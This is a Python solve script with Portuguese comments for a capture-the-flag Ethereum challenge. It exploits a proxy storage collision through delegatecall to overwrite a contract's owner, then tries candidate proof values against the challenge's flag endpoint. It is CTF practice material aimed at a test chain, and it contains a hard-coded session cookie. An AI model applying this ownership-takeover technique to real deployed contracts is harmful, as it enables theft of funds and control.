#!/usr/bin/env python3
"""
Maintenance Hatch (<HOST>) — solve + flag numa sessão só.

Pré-requisitos: pip install requests eth-account
Uso:
  1) No navegador logado, abra o desafio e pegue o cookie hik_team
     (DevTools -> Application -> Cookies -> <HOST>...). Cole em COOKIE abaixo.
  2) python3 solve.py

O script: lê a instância do cookie, resolve on-chain (storage-collision:
arm -> f83ba31c(player) -> claim), confirma isSolved(), e tenta o /flag.

proof (web3) = valor CRU, SEM o sha256(secret.hex()) dos challenges de REV.
Pelo spec do instance.json: "challenge-specific value after Setup.isSolved()
(lowercase hex, no 0x for addresses)". Testamos os endereços candidatos.
"""
import requests, json, hashlib, time
from eth_account import Account

RPC  = "<HOST>"
BASE = "<HOST>"
COOKIE = {"hik_team": "0220b160543026b0"}   # <-- ATUALIZE se mudou no navegador

S = requests.Session(); S.cookies.update(COOKIE)

def rpc(m, p):
    return S.post(RPC, json={"jsonrpc":"2.0","id":1,"method":m,"params":p}, timeout=30).json().get("result")

# 1) instância atual do cookie
inst  = S.get(f"{BASE}/instance.json", timeout=20).json()
setup = inst["contracts"]["setup"]; player = inst["player"]; pk = inst["playerPrivateKey"]
A2 = "0x" + rpc("eth_call", [{"to":setup, "data":"0xec556889"}, "latest"])[26:]  # challenge()/target
A1 = "0x" + rpc("eth_call", [{"to":A2,    "data":"0x5c60da1b"}, "latest"])[26:]  # implementation()
print(f"playerId={inst['playerId']} setup={setup}\nA2(target)={A2} A1(hatch)={A1}")

# 2) resolve on-chain (3 txs)
def send(data):
    nonce = int(rpc("eth_getTransactionCount", [player, "pending"]), 16)
    gp    = int(rpc("eth_gasPrice", []), 16)
    tx = {"nonce":nonce, "to":A2, "value":0, "gas":200000, "gasPrice":gp, "data":data, "chainId":31337}
    raw = Account.sign_transaction(tx, pk).raw_transaction.hex()
    raw = raw if raw.startswith("0x") else "0x"+raw
    print("  tx ->", rpc("eth_sendRawTransaction", [raw])); time.sleep(1.5)

p = player[2:].lower()
print("resolvendo...")
send("0x20c69c89" + "0"*63 + "1")   # arm(1)   via fallback de A2 -> delegatecall A1
send("0xf83ba31c" + "0"*24 + p)     # f83ba31c(player) -> storage collision -> A2.owner = player
send("0x2f2ec7fe")                  # claim()  -> claimed = true
time.sleep(2)

isSolved = rpc("eth_call", [{"to":setup, "data":"0x64d98f6e"}, "latest"])
owner    = rpc("eth_call", [{"to":A2,    "data":"0x8da5cb5b"}, "latest"])
print(f"isSolved={isSolved}\nowner={owner}")

# 3) flag — proof = valor cru; token = sha256("ticket:proof")
def tryp(label, proof):
    t = S.get(f"{BASE}/ticket", timeout=20).json()["ticket"]
    token = hashlib.sha256(f"{t}:{proof}".encode()).hexdigest()
    r = S.post(f"{BASE}/flag", json={"ticket":t, "token":token}, timeout=20)
    print(f"[{label}] proof={proof} -> {r.status_code} {r.text.strip()}")
    return r.status_code == 200 and "flag" in r.text.lower()

if isSolved and isSolved.endswith("1"):
    candidates = [
        ("player",    player[2:].lower()),
        ("A2_target", A2[2:].lower()),
        ("setup",     setup[2:].lower()),
        ("A1_hatch",  A1[2:].lower()),
        ("privkey",   pk[2:].lower()),
    ]
    for lbl, pf in candidates:
        if tryp(lbl, pf):
            print("\n*** FLAG ENCONTRADA ACIMA ***")
            break
    else:
        print("\nNenhum candidato bateu. proof pode ser outro valor challenge-specific.")
        print("Ver a 'proof table' do track README (mencionada no spec), ou me diz o que achou.")
else:
    print("NAO resolveu (instancia pode ter resetado). Rode o script de novo — ele faz tudo junto.")
